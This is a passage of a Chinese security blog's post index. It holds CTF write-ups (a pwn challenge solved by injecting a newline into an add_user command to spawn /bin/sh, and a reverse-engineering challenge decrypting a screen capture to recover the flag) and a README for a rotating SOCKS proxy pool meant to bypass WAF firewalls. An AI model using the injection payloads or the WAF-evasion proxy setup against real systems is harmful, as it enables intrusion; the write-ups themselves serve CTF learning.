winmt✌自己都懵了哈哈哈，题目设置的有点bug，这里的变量s和功能1用的是同一个导致了非预期解。\n\n![](http://cdn.anyiblog.top//common/20230605100249.png)\n\n所以思路就打开了，既然这里用的是同一个变量，那么就可以利用起来。\n\n首先当前绕过我们可以用单引号' 来绕过引号限制，然后想要执行别的命令 已知的逻辑运算符基本都被过滤了，那咋办呢？调试的时候发现了换行符，便想到换行符也可以绕过从而命令执行：\n\n![](http://cdn.anyiblog.top//common/20230605100514.png)\n\n因为功能1和功能2输入的时候都有换行，所以就造成了两条命令的分割：\n\n```\nadd_user -u 'aaaa'\\n../../keys\\n' -p '888888'\n```\n\n第一个换行符造成了第二条命令的执行，第二个换行符又同时把单引号分割开了 起到了**注释**的作用。所以这里我们只需要保证 `../../keys`的部分能够命令执行即可。\n\n那么，如果将功能1输入的部分换成/bin/sh不就能拿到shell了吗？同时/bin/sh又是一个文件 符合功能1的条件。\n\npython测试下：\n\n![](http://cdn.anyiblog.top//common/20230605101022.png)\n\n测试可行，那么我们构造下/bin/sh的语句。\n\n```\n../../../../../././bin/sh\n```\n\n然后去gdb调试，最好打好断点去调试测试，这样很直观就能知道哪里需要填充多少。\n\n![](http://cdn.anyiblog.top//common/image-20230605101649769.png)\n\n\n\n![](http://cdn.anyiblog.top//common/image-20230605101737640.png)\n\n这里功能2输入的部分要填充功能1不必要的部分。\n\n很显然可以只输入一个单引号，语句就变成了这样：\n\n```\nadd_user -u ''\\n/bin/sh\\n' -p '888888'\n```\n\n或者我们把/bin去掉，构造sh：\n\n```\nadd_user -u 'aaaaa'\\nsh\\n' -p '888888'\n```\n\n二者都可以，带入程序得到shell\n\n```\nPayload1:\n\n1: ../../../../../././bin/sh\n2: '\n\nPayload2:\n\n1: ../../../../../././bin/sh\n2: aaaaa'\n```\n\n![](http://cdn.anyiblog.top//common/20230605102028.png)\n\n![](http://cdn.anyiblog.top//common/image-20230605102126179.png)\n\n比赛的时候测试了一个上午做出来的，做完发现第四...差一点三血 比较可惜哈哈。\n\n## winmt师傅的Payload \n\nwinmt✌太强了\n\n![](http://cdn.anyiblog.top//common/9N%5BYZSCBLP%7B008FMQE8YHNE.png)\n\nwinmt师傅预期解是用tab和换行绕过，如果功能1和功能2不是同个变量那这题绕过确实还要花点脑筋的。\n\n学到东西了！\n\n\n\n# [Reverse]cap\n\n这题看了我好几个小时终于做出来了，太菜了呜呜呜\n\n调试的地狱绘图：\n\n![](http://cdn.anyiblog.top//common/20230605.jpg)\n\n## 分析\n\n附件给个一个exe程序和bin数据文件。\n\ncap.bin：\n\n![](http://cdn.anyiblog.top//common/image-20230605103613026.png)\n\nre3.exe 64位无壳。\n\n程序大致作用就是对当前屏幕进行捕获，然后将得到的缓冲数据进行加密后，写入到bin数据文件。\n\n主函数：\n\n```c\n__int64 __fastcall sub_140001030(HWND hWnd)\n{\n  HBITMAP v2; // r14\n  HDC hdcSrc; // r13\n  HDC v4; // rsi\n  HDC v5; // r15\n  int hSrc; // ebx\n  int wSrc; // eax\n  HBITMAP v8; // rax\n  signed int v9; // ebx\n  HANDLE v10; // rax\n  void *v11; // r12\n  signed int v12; // er10\n  _BYTE *v13; // r9\n  int v14; // ecx\n  int v15; // edx\n  void *lpBuffer; // [rsp+60h] [rbp-59h]\n  HGLOBAL hMem; // [rsp+68h] [rbp-51h]\n  struct tagRECT Rect; // [rsp+70h] [rbp-49h] BYREF\n  struct tagBITMAPINFO bmi; // [rsp+80h] [rbp-39h] BYREF\n  char v21; // [rsp+ACh] [rbp-Dh]\n  char v22; // [rsp+ADh] [rbp-Ch]\n  char v23; // [rsp+AEh] [rbp-Bh]\n  char v24; // [rsp+AFh] [rbp-Ah]\n  char v25; // [rsp+B0h] [rbp-9h]\n  char v26; // [rsp+B1h] [rbp-8h]\n  int v27; // [rsp+B2h] [rbp-7h]\n  DWORD NumberOfBytesWritten; // [rsp+B8h] [rbp-1h] BYREF\n  char pv[4]; // [rsp+C0h] [rbp+7h] BYREF\n  LONG v30; // [rsp+C4h] [rbp+Bh]\n  UINT cLines; // [rsp+C8h] [rbp+Fh]\n\n  NumberOfBytesWritten = 0;\n  v2 = 0i64;\n  hdcSrc = GetDC(0i64);\n  v4 = GetDC(hWnd);\n  v5 = CreateCompatibleDC(v4);\n  if ( v5 )\n  {\n    GetClientRect(hWnd, &Rect);\n    SetStretchBltMode(v4, 4);\n    hSrc = GetSystemMetrics(1);\n    wSrc = GetSystemMetrics(0);\n    if ( StretchBlt(v4, 0, 0, Rect.right, Rect.bottom, hdcSrc, 0, 0, wSrc, hSrc, 0xCC0020u) )\n    {\n      v8 = CreateCompatibleBitmap(v4, Rect.right - Rect.left, Rect.bottom - Rect.top);\n      v2 = v8;\n      if ( v8 )\n      {\n        SelectObject(v5, v8);\n        if ( BitBlt(v5, 0, 0, Rect.right - Rect.left, Rect.bottom - Rect.top, v4, 0, 0, 0xCC0020u) )\n        {\n          GetObjectW(v2, 32, pv);\n          bmi.bmiHeader.biWidth = v30;\n          bmi.bmiHeader.biHeight = cLines;\n          bmi.bmiHeader.biSize = 40;\n          *(_QWORD *)&bmi.bmiHeader.biPlanes = 2097153i64;\n          *(_QWORD *)&bmi.bmiHeader.biSizeImage = 0i64;\n          *(_QWORD *)&bmi.bmiHeader.biYPelsPerMeter = 0i64;\n          bmi.bmiHeader.biClrImportant = 0;\n          v9 = 4 * cLines * ((32 * v30 + 31) / 32);\n          hMem = GlobalAlloc(0x42u, (unsigned int)v9);\n          lpBuffer = GlobalLock(hMem);\n          GetDIBits(v4, v2, 0, cLines, lpBuffer, &bmi, 0);\n          v10 = CreateFileW(L\"cap.bin\", 0x40000000u, 0, 0i64, 2u, 0x80u, 0i64);\n          v23 ^= 0x64u;\n          v24 ^= 0x61u;\n          v11 = v10;\n          v25 ^= 0x73u;\n          v26 ^= 0x63u;\n          bmi.bmiHeader.biSize ^= 0x79625F63u;\n          bmi.bmiHeader.biWidth ^= 0x7361645Fu;\n          bmi.bmiHeader.biHeight ^= 0x65667463u;\n          *(_QWORD *)&bmi.bmiHeader.biPlanes ^= 0x61645F79625F636Eui64;\n          bmi.bmiColors[0].rgbReserved = ((unsigned __int16)(v9 + 54) >> 8) ^ 0x62;\n          v21 = ((unsigned int)(v9 + 54) >> 16) ^ 0x79;\n          v22 = ((unsigned int)(v9 + 54) >> 24) ^ 0x5F;\n          v27 = 1852139074;\n          bmi.bmiColors[0].rgbGreen = 46;\n          bmi.bmiColors[0].rgbBlue = 44;\n          bmi.bmiColors[0].rgbRed = (v9 + 54) ^ 0x5F;\n          v12 = 0;\n          *(_QWORD *)&bmi.bmiHeader.biSizeImage ^= 0x5F636E6566746373ui64;\n          *(_QWORD *)&bmi.bmiHeader.biYPelsPerMeter ^= 0x74637361645F7962ui64;\n          bmi.bmiHeader.biClrImportant ^= 0x636E6566u;\n          if ( v9 > 0 )\n          {\n            v13 = lpBuffer;\n            do\n            {\n              v14 = v12 + 3;\n              v15 = (unsigned __int64)(1321528399i64 * (v12 + 3)) >> 32;\n              ++v12;\n              *v13++ ^= aEncByDasctf[v14 - 13 * (((unsigned int)v15 >> 31) + (v15 >> 2))];\n            }\n            while ( v12 < v9 );\n          }\n          WriteFile(v10, bmi.bmiColors, 0xEu, &NumberOfBytesWritten, 0i64);\n          WriteFile(v11, &bmi, 0x28u, &NumberOfBytesWritten, 0i64);\n          WriteFile(v11, lpBuffer, v9, &NumberOfBytesWritten, 0i64);\n          GlobalUnlock(hMem);\n          GlobalFree(hMem);\n          CloseHandle(v11);\n        }\n        else\n        {\n          MessageBoxW(hWnd, L\"BitBlt has failed\", L\"Failed\", 0);\n        }\n      }\n      else\n      {\n        MessageBoxW(hWnd, L\"CreateCompatibleBitmap Failed\", L\"Failed\", 0);\n      }\n    }\n    else\n    {\n      MessageBoxW(hWnd, L\"StretchBlt has failed\", L\"Failed\", 0);\n    }\n  }\n  else\n  {\n    MessageBoxW(hWnd, L\"CreateCompatibleDC has failed\", L\"Failed\", 0);\n  }\n  DeleteObject(v2);\n  DeleteObject(v5);\n  ReleaseDC(0i64, hdcSrc);\n  ReleaseDC(hWnd, v4);\n  return 0i64;\n}\n```\n\n这题还是要多调试，看变量值才能理解代码。\n\n前面都是创建bmp图像的初始操作，主要的部分：\n\n![](http://cdn.anyiblog.top//common/20230605103219.png)\n\n这里定义了bmp图像的文件头属性，包括宽度、高度、尺寸以及图像的颜色等等。\n\n先不用管这些值具体是多少，理解代码即可。\n\n注意这里创建了 `cap.bin` 我们继续往下看\n\n![](http://cdn.anyiblog.top//common/20230605103510.png)\n\n\n\n### bin数据1-14字节\n\n有个明显的 `WriteFile` 说明bin文件的数据都来自这，那我们分析都写了什么东西就知道bin文件数据的意思了。\n\n```\nWriteFile(v10, bmi.bmiColors, 0xEu, &NumberOfBytesWritten, 0i64); //第一行\n```\n\n这里是 `bmi.bmiColors` 说明第一个写入的是bmiColors的信息，写入了 `0xE(14)` 的数据。\n\n我们看bmicolors的部分：\n\n![](http://cdn.anyiblog.top//common/20230605103840.png)\n\n有直接告诉我们值，这里 Red 和Reverse的值静态调试看不明白，调试一下就知道了 先不管。\n\n所以按照Reverse R G B的顺序逆序写入，hex分析第一和第二字节应该是 0x2c(44) 和  0x2e(46)\n\n第一部分的数据如下：\n\n![](http://cdn.anyiblog.top//common/20230605104450.png)\n\n没错说明我们分析的没错。至于后面的10字节的部分我们可以不管。\n\n### bin数据15-54数据\n\n```\nWriteFile(v11, &bmi, 0x28u, &NumberOfBytesWritten, 0i64); //第二行\n```\n\n第二行是将 `&bmi` 的部分写入 `0x28(40)` 的数据，bmi包括上面定义的header文件头信息。\n\n这里我没太看懂数据的含义，所以直接忽略了，因为主要的部分其实是第三部分，所以这里忽略其实问题不大。\n\n第二部分的数据如下：\n\n![](http://cdn.anyiblog.top//common/20230605104439.png)\n\n\n\n### bin数据55-End数据\n\n```\nWriteFile(v11, lpBuffer, v9, &NumberOfBytesWritten, 0i64); //第三行\n```\n\n第三行就是最后的数据了。将 `lpBuffer` 写入 v9 的长度，其实就是图像的大小。\n\n这里是最关键的部分，我们跟进找下 `lpBuffer` 哪里有引用：\n\n![](http://cdn.anyiblog.top//common/20230605104715.png)\n\n首先是用了 `GetDIBits` 函数生成了 `lpBuffer` ，这个函数我在网上找了下相关的文章（资料是真的少）\n\n(https://www.cnblogs.com/GreyWang/p/17123873.html)\n\n![](http://cdn.anyiblog.top//common/20230605104903.png)\n\n很显然这个函数是用来获取图像的数据的，根据它文章的例子能发现GetDIBits的第5个参数就是缓冲区数据，也就是我们这个程序中的 `lpBuffer`\n\n之后再次调用就是对这个缓冲区数据进行加密了：\n\n![](http://cdn.anyiblog.top//common/20230605105111.png)\n\nIDA编译的有些问题，简化下就是下面的部分：\n\n```c\ndo\n{\n  v14 = v12 + 3;\n  v15 = (1321528399 * v14) >> 32;\n  v12 = v12 + 1;\n  lpBuffer ^= aEncByDasctf[v14 - 13 * ((v15 >> 31) + (v15 >> 2))];\n}\nwhile ( v12 < v9 );\n```\n\n`aEncByDasctf` -> `enc_by_dasctf`\n\n![](http://cdn.anyiblog.top//common/20230605105304.png)\n\n一个很简单的加密，由于是异或所以我们解密其实照着写就可以了。\n\n## 思路\n\n这个 `lpBuffer` 虽然都说是缓冲区数据，但这个数据到底是什么，我没有在网上的文档找到，所以当时做的时候打算先把这个东西还原出来，然后再去猜测、分析。\n\n最后发现这里的数据就是捕获到的图像的RGB值。\n\n其实前面第一部分和第二部分的16进制数据没搞懂有什么用，到最后也确实没用上hhh\n\n## 数据还原脚本\n\n这里读取下数据，然后把算法逆向解密一下即可得到lpBuffer的原数据，最后写到新文件里分析。\n\n```python\nimport binascii\nfrom PIL import Image\n\ndef read_data():\n\n\tf = open('cap.bin','rb')\n\n\tf.read(14+40)\n\n\tcontent = f.read()\n\n\treturn content\n\ndef decode(data):\n\tv12 = 0\n\tstring = b'enc_by_dasctf'\n\tresult = [0] * len(data)\n\tfor i in range(len(data)):\n\t\tv14 = v12 + 3\n\n\t\tv15 = (0x4EC4EC4F * v14)>>32\n\t\tresult[v12] = hex(string[v14 - 13 * ((v15 >> 31 ) + (v15 >> 2))] ^ data[v12])[2:].zfill(2)\n\t\tv12 += 1\n\n\treturn binascii.unhexlify(''.join(result))\n\ndef encode():\n\tv12 = 0\n\tstring = b'enc_by_dasctf'\n\tv13 = [0xda,0xda,0xda]\n\tfor i in range(len(v13)):\n\t\tv14 = v12 + 3\n\n\t\tv15 = (0x4EC4EC4F * v14)>>32\n\t\tv13[v12] ^= string[v14 - 13 * ((v15 >> 31 ) + (v15 >> 2))]\n\t\tv12 += 1\n        \n\tprint(v13)\n\t\t\n\ndata = read_data()\n\ncontent = decode(data)\nopen('capDecode.bin','wb').write(content)\n```\n\n运行得到capDecode.bin：\n\n![](http://cdn.anyiblog.top//common/20230605105910.png)\n\n\n\n这个东西其实我是猜测出来的，加上当时看到一道比较类似的题目：\n\nhttp://1o1o.xyz/CSDN/170926%20%E9%80%86%E5%90%91-Reversing.kr%EF%BC%88ImagePrc%EF%BC%89_%E5%A5%88%E6%B2%99%E5%A4%9C%E5%BD%B1%E7%9A%84%E5%8D%9A%E5%AE%A2.pdf\n\n直觉告诉我这肯定是RGB值啊，每3个数据一组 很多一样的16进制。\n\n那么就根据猜想继续写脚本，至于图片的长度和宽度可以先设置大一些，然后再慢慢调整。\n\n\n\n## 图像还原脚本\n\n```python\nimport binascii\nfrom PIL import Image\n\n\ndef read_data():\n\n\tf = open('cap.bin','rb')\n\n\tf.read(14+40)\n\n\tcontent = f.read()\n\n\treturn content\n\ndef decode(data):\n\tv12 = 0\n\tstring = b'enc_by_dasctf'\n\tresult = [0] * len(data)\n\tfor i in range(len(data)):\n\t\tv14 = v12 + 3\n\n\t\tv15 = (0x4EC4EC4F * v14)>>32\n\t\tresult[v12] = hex(string[v14 - 13 * ((v15 >> 31 ) + (v15 >> 2))] ^ data[v12])[2:].zfill(2)\n\t\tv12 += 1\n\n\treturn binascii.unhexlify(''.join(result))\n\ndef encode():\n\tv12 = 0\n\tstring = b'enc_by_dasctf'\n\tv13 = [0xda,0xda,0xda]\n\tfor i in range(len(v13)):\n\t\tv14 = v12 + 3\n\n\t\tv15 = (0x4EC4EC4F * v14)>>32\n\t\tv13[v12] ^= string[v14 - 13 * ((v15 >> 31 ) + (v15 >> 2))]\n\t\tv12 += 1\n\n\t\tprint(v13)\n\t\t\n\ndata = read_data()\n#\n#decodeFile = open('capDecode2.bin','wb')\ncontent = decode(data)\n\n'''content = open('capDecode2.bin','rb').read()\n\n\nim = Image.frombytes('RGB', (1280,960), content)\nim = im.transpose(Image.FLIP_TOP_BOTTOM)\nim.show()\nim.save('result.bmp')'''\n\nwidth = 2560*2\nheight = 256\n\nimg = Image.new('RGB',(width,height))\nx = 0\ny = 0\n\nfor i in range(0,len(content),3):\n\t\n\n\ttry:\n\t\tR,G,B = content[i:i+3]\n\t\timg.putpixel((x,y),(R,G,B))\n\texcept Exception as e:\n\t\tprint(x,y,e)\n\t\tpass\n\n\tx += 1\n\n\tif x == width:\n\t\ty += 1\n\t\tx = 0\n\nimg = img.transpose(Image.FLIP_TOP_BOTTOM)\nimg.save('tmp.bmp')\nimg.show()\n```\n\n注意这里bmp要用 `img.transpose(Image.FLIP_TOP_BOTTOM)` 旋转下，不然图像是逆转的。\n\n同时可以直接用我注释的部分实现还原，省了不少代码 唯一不足就是宽高必须正确填写。\n\n\n\n这里图像宽高其实就是1280*960。\n\n![](http://cdn.anyiblog.top//common/image-20230605110347666.png)\n\n因为这里大小为3,686,400 ，除去3就是1228800，即1280*960。\n\n但是宽高我测试过来2560*2 256看的比较清楚\n\n\n\n运行得到图像：\n\n![](http://cdn.anyiblog.top//common/20230605110601.png)\n\n能看到flag，但是看不清 这题是真的阴间。。看的我眼睛瞎。\n\n用PS拉伸宽度+提高曝光度下得到一张完美的图像：\n\n![](http://cdn.anyiblog.top//common/QQ%E6%88%AA%E5%9B%BE20230604204425.png)\n\n这里e 很容易看成c，但是你放大对比下就发现有区别。多试几次得到flag\n\n\n\n## 预期解\n\n其实可以通过调试发现cap.bin每个字节都在与 `enc_by_dasctf` 异或，且在0~12循环，所以每个字节异或就可以得到原bmp图像。\n\n```python\nkey = \"enc_by_dasctf\"\nwith open('cap.bin', 'rb') as f:\n    s = bytearray(f.read())\nfor i in range(len(s)):\n    s[i] ^= ord(key[(i+1) % len(key)])\nwith open('flag.bmp', 'wb') as f:\n    f.write(s)\n```\n\n![](http://cdn.anyiblog.top//common/image-20230605143116815.png)\n\n\n\n## flag\n\nDASCTF{3d0bd550-edbe-11ed-b2a3-f1d90bff20c4}\n\n\n\n本来想讲下调试的过程的，但其实想了想调试就是为了方便能看懂代码，这个过程文章写起来又太麻烦，所以就不写了，笔者复现最好多调试便于理解。\n","tags":["CTF","干货"],"categories":["刷题笔记","Writeup"]},{"title":"ProxyPoolxSocks Socks代理池服务端自动化搭建工具","url":"/2023/05/15/20230515/","content":"Github项目： https://github.com/Anyyy111/ProxyPoolxSocks\n\n声明：本工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担。\n\n## 0x01 介绍\n\n作者: Anyyy\n\n博客: https://www.anyiblog.top\t\n\n本文地址： https://www.anyiblog.top/2023/05/15/20230515/\n\nProxyPoolxSocks 是一个代理池服务端工具，可以导入自定义的socks节点，其作用是利用多个代理IP绕过WAF防火墙。\n\n当前处于测试阶段，任何问题欢迎向我发送邮件：anyiguys@qq.com\n\n工具支持Windows和Linux系统。\n\n## 0x02 安装\n\n注意python环境3.7以上即可。\n\n### 服务端\n\n```\ngit clone https://github.com/Anyyy111/ProxyPoolxSocks.git\ncd ProxyPoolxSocks\npip install -r requirements.txt\npython3 run.py\n```\n\n详细配置请参考 **0x04 使用说明**\n\n### 客户端\n\n服务端配置好之后，修改client.py，运行即可测试可用性。\n\n详细配置请参考 **0x04 使用说明**\n\n```\ngit clone https://github.com/Anyyy111/ProxyPoolxSocks.git\ncd ProxyPoolxSocks\npython3 Client-check/client.py\n```\n\n测试可用之后可跳转至 **0x05 常见工具代理配置**\n\n\n\n## 0x03 效果展示\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515161255262.png)\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515161416289.png)\n\n\n\n## 0x04 使用说明\n\n### 服务端配置\n\n#### 1.设置config.py参数\n\n```python\n# -*- coding: utf-8 -*-\nimport time\n\n\"\"\"\n必要参数\nusername&password: 服务端要求验证的账号密码 留空代表不需要账号密码\n\"\"\"\nusername= \"\"\n\npassword= \"\"\n\n\"\"\"\n必要参数\nport: 服务端开放的端口\n\"\"\"\nport = 12000\n\n\"\"\"\n必要参数\ntimes: 代理切换速度 单位 ms 默认为 3 秒\n\"\"\"\ntimes = 3000\n\n\"\"\"\n可选参数\nServerLog: 显示服务端信息 1为开启 0为关闭\nRecord: 开启日志记录 1为开启 0为关闭    PS: 日志只记录 服务端 的连接记录\n\"\"\"\nServerLog = 1\nRecord = 1\n\n\n# 颜色参数 忽略即可\nred = \"\\033[1;31m\"\ngreen = \"\\033[1;32m\"\nblue = \"\\033[1;34m\"\ncyan = \"\\033[1;36m\"\nyellow = \"\\033[1;33m\"\nend = \"\\033[0m\"\n\n# 日志名称 同样忽略即可\nlogname = f'Logs/Server_{time.strftime(\"%Y%m%d_%H%M%S\")}.log'\n```\n\n配置文件我已经配置好了，你可以根据需求更改参数：\n\n- username & password 服务端的连接账号密码**，如果留空则代表不需要密码，**如果填写必须二者都填写 且客户端连接要账密一致才能使用代理\n- port **服务端搭起的端口**，默认为12000，最终连接的端口就是这\n- **times** **代理池之间代理切换的速度**，单位为毫秒，times越小切换越快，尽量不要太小容易出问题。\n- ServerLog **显示服务端的信息**，设置为0则代表关闭 也就代表只显示客户端的连接信息。\n- Record **开启日志文件记录**，设置为0则代表关闭 日志文件存放在 **Logs/Server_xxxx_xxxx.log**\n\n\n\n\n\n#### 2.将socks节点添加至node.txt\n\nnode.txt是必须配置项，因为程序读取的节点就是来自这里。其中一行代表一个代理地址。\n\n形式如下：\n\n```\n## socks://base64(username:password)@IP:PORT\n\nsocks://NTU1NTU6NTU1NTU=@8.xxx.xxx.12:59108#3\nsocks://YWFhYWE6YWFhYWE=@8.xxx.xxx.12:38810#1\nsocks://YWFhYWE6YWFhYWE=@152.xx.xxx.225:38829\nsocks://NTU1NTU6NTU1NTU=@47.xxx.xxx.214:59108#4\n```\n\n同样支持base64形式：\n\n```\nc29ja3M6Ly9OVFUxTlRVNk5UVTFOVFU9QDgueHh4Lnh4eC4xMjo1OTEwOCMzCnNvY2tzOi8vWVdGaFlXRTZZV0ZoWVdFPUA4Lnh4eC54eHguMTI6Mzg4MTAjMQpzb2NrczovL1YzRkRjazFvVlVsdFZUcGFSMjFsVVVOMGVVNWFAMTUyLnh4Lnh4eC4yMjU6Mzg4MjkKc29ja3M6Ly9OVFUxTlRVNk5UVTFOVFU9QDQ3Lnh4eC54eHguMjE0OjU5MTA4IzQ=\n```\n\n你可以直接从V2ray等代理软件里复制节点，选中节点并复制\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515163301348.png)\n\n\n\n或者如果你购买了机场，你可以在你的代理软件里找到你订阅的服务器地址，然后在文件夹输入以下命令即可：\n\n（一般订阅地址长这样：`https://xxx.com/api/v1/client/subscribe?token=xxxxxx`）\n\n```\ncurl https://xxx.com/api/v1/client/subscribe?token=xxxxxx -o node.txt\n```\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515164116160.png)\n\n*程序只会调用订阅地址中存在socks协议的部分，其它部分忽略。\n\n\n\n**注：测试的时候只拿了V2ray的socks节点来测试，如果你是其它的代理软件请将节点修改成符合以上的形式后写入node.txt中。**\n\n**这里程序不提供免费的节点，如果你有socks节点就可以自定义添加。**\n\n\n\n#### 3.运行run.py\n\n在你的Windows/Linux系统下使用python3运行程序：\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515164753382.png)\n\n\n\n首次运行会读取节点并测试节点可用性，并会将可用的节点记录，等待下一次运行的时候可以直接调用可用节点：\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515165032157.png)\n\n等待测试完毕之后此时服务端就开启成功了：\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515171103341.png)\n\n\n\n**然后找到你自己的 公网/内网 IP地址，客户端使用socks5协议连接你服务端的 IP、端口、用户名、密码 即可**\n\n这里以内网为例，我的服务端是192.168.31.226\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515165322694.png)\n\n### 客户端连接\n\n客户端IP 192.168.31.225\n\n#### 1.client.py测试连接可用性\n\n找到 `Client-check/client.py` 文件，该文件作用是验证连接可用性。\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\nimport socket\nimport socks\nimport os\n\nprint('Client 客户端测试代理连接脚本')\n\nwhile 1:\n    try:\n\n        # 不存在密码就用这一条\n        socks.set_default_proxy(socks.SOCKS5, \"0.0.0.0\", 12000)\n\n        # 客户端存在密码用这一条\n        ## socks.set_default_proxy(socks.SOCKS5, \"0.0.0.0\", 12000, username='aaa',password='bbb')\n        \n        socket.socket = socks.socksocket\n\n        response = requests.get('https://ifconfig.me/',timeout=5).text\n        \n        print(\"测试成功 当前代理:\",response)\n\n    except KeyboardInterrupt:\n\n        os._exit(0)\n```\n\n*注意要根据客户端账密是否配置 来选择注释代码的部分。\n\n配置完成后，运行脚本：\n\n```\npython client.py\n```\n\n\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515165842193.png)\n\n显示测试成功则代表客户端与服务端通信无误，这个时候你就可以将代理地址写入各个代理软件，开心耍了~\n\n#### 2.服务端回显\n\n此时服务端会显示连接信息：\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515170032093.png)\n\n同时会在 **Logs/Server_xxxx_xxxx.log** 记录服务端连接信息\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515170603642.png)\n\n## 0x05 常见工具代理配置\n\n\n\n### Proxifier\n\n\n\n#### 代理服务器配置\n\n\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515171813109.png)\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515172006451.png)\n\n\n\n检查可用性：\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515172833070.png)\n\n\n\n这里测试设置中要记得勾去这一选项，不然会检验失败\n\n这里其实也算是程序的一点缺陷，后续慢慢补全。\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515172818825.png)\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515172755347.png)\n\n#### 规则设置\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515172153142.png)\n\n将想要使用代理的应用程序设置刚刚配置好的代理服务器即可\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515172112825.png)\n\n\n\n设置成这样就可以了，默认的localhost记得要勾上，不然会连不到 一个localhost 一个你想代理的应用。\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515172635381.png)\n\n#### 测试\n\n访问ifconfig.m发现已经是代理IP了\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515172510772.png)\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515172549015.png)\n\n\n\n### Firefox\n\nPS: 代理工具不要同时开好几个，不然会出问题的\n\n打开火狐浏览器，设置-代理中：\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515173109942.png)\n\n\n\n这里要关闭 **使用 SOCKS v5 时代理 DNS 查询** 这一选项，不然会连接不上。\n\n\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515173210822.png)\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515173220545.png)\n\n\n\n### ProxyChains4\n\n修改proxychains4.conf配置文件：\n\n```\nvim /etc/proxychains4.conf\n```\n\n在最后一行写入socks5代理地址\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515173714217.png)\n\n\n\n同时这里 strict_chain 要记得注释掉。\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515173733682.png)\n\n\n\n输入以下命令即可调用代理：\n\n```\nproxychains4 bash\ncurl https://ifconfig.me\n```\n\n\n\n### Python脚本调用代理\n\n#### 方法一\n\n在你的脚本添加这些代码：\n\n```python\nimport socks\n\n# 不存在密码就用这一条\nsocks.set_default_proxy(socks.SOCKS5, \"0.0.0.0\", 12000)\n\n# 客户端存在密码用这一条\n## socks.set_default_proxy(socks.SOCKS5, \"0.0.0.0\", 12000, username='aaa',password='bbb')\n        \nsocket.socket = socks.socksocket\n```\n\n#### 方法二\n\n使用requests库的时候可以设置proxies参数\n\n```python\nimport requests\n\n## 带有密码的情况\n# 格式: socks5://usernm:passwd@IP:PORT\nproxies = { \n\t'http':'socks5://aaa:bbb@0.0.0.0:12000'\n\t'https':'socks5://aaa:bbb@0.0.0.0:12000'\n}\n\n## 无密码的情况\n# 格式: socks5://IP:PORT\nproxies = { \n\t'http':'socks5://0.0.0.0:12000'\n\t'https':'socks5://0.0.0.0:12000'\n}\n\nprint(requests.get('https://ifconfig.me/').text)\n```\n\n\n\n### Curl调用\n\n```\ncurl -x \"socks5://0.0.0.0:12000\" https://ifconfig.me // 无密码\ncurl -x \"socks5://aaa:bbb@0.0.0.0:12000\" https://ifconfig.me // 存在密码\n```\n\n\n\n## 0x06 程序原理\n\n\n\n服务端运行时，程序首先会获取node.txt里的socks节点并测试socks节点可用性，然后添加到一个列表里，暂且称之为代理池；\n\n之后是一个随机取的操作，将代理池的代理随机取出，并添加到另一个新的列表代理池中，当代理池代理用完之后就会换用新的代理池，这样就实现了循环代理；\n\n使用socks模块将取出的代理服务器进行代理，同时服务端调用 `server.py` ，该脚本文件就是一个简单的socks5代理服务器实现。\n\n根据搭起的socks5通道，**将先前代理流量分配到这个通道中，就实现了以一个代理服务器来代理服务端和客户端之间的通信，那么这时候客户端得到的就是代理服务器的流量**\n\n那么再循环代理池的任一代理服务器给服务端，客户端请求服务端，这时候就实现了服务端的多个代理流量变换，客户端也就得到了一个 **可任意更换代理频率的代理服务器流量**\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/image-20230515182500896.png)\n\n![](http://cdn.anyiblog.top/product/proxypoolsocks/imgs/flow.png)\n\n\n\n## 0x07 参考文章\n\n`Server.py`部分参考了这位大佬写的socks5代理代码：https://github.com/dyboy2017/DYPROXY/\n\n原理讲的很详细，测试过来有些地方有bug我自己稍加修改了。\n\n其它的代码部分都是用头发换的（\n\n\n\n## 0x08 尾声End\n\n**第一次正式的提交Github项目，其实我本人还是喜欢开发的，只是比较懒不想传github XD，之后有空我会将更多的实用项目分享出来。如果你觉得我的工具还不错的话那么不妨点一个Star或者提交一个Issue，这些都是我前进的动力。**\n\n**测试过来程序还是存在很多bug，包括我后续想添加vmess、Shadowsocks等节点，奈何网上相关的文章较少同时也是比较耗时的，导致这不是一个完整的项目，还需要慢慢改进修改。师傅们有什么想法可以交流下。**\n\n**如果你觉得有说的不对的地方请指出 希望能让这个工具更加完善 更加适用。**\n","tags":["干货","开发","渗透"],"categories":["开发","ProxyPoolSocks"]},{"title":"从0开始的CTFd平台后续工作以及题目制作","url":"/2023/04/13/20230413/","content":"# 